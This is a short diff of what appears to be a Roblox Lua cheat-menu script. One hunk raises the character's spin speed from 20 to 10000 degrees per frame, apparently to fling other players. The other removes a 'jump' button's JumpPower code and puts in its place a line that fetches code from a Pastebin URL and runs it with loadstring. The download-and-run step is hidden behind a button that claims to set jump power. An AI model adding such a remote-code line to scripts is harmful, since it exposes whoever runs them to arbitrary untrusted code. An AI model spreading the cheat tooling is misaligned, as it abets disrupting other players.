@@ -327,7 +327,7 @@ local character = player.Character or player.CharacterAdded:Wait()
 local hrp = character:WaitForChild("HumanoidRootPart")
 
 -- Spin speed (radians per frame)
-local spinSpeed = math.rad(20)
+local spinSpeed = math.rad(10000)
 
 -- Function to keep spinning the character
 RunService.RenderStepped:Connect(function()
@@ -385,11 +385,7 @@ jump.TextColor3 = Color3.new(255, 255, 255)
 jump.Font = Enum.Font.Code
 jump.Parent = sf1
 jump.MouseButton1Click:Connect(function()
-	character = player.Character or player.CharacterAdded:Wait()
-	local humanoid = character:FindFirstChildOfClass("Humanoid")
-	if humanoid then
-		humanoid.JumpPower = 100
-	end
+loadstring(game:HttpGet("https://pastebin.com/raw/xRdqvqvJ"))()
 end)
 
 local infjump = Instance.new("TextButton")
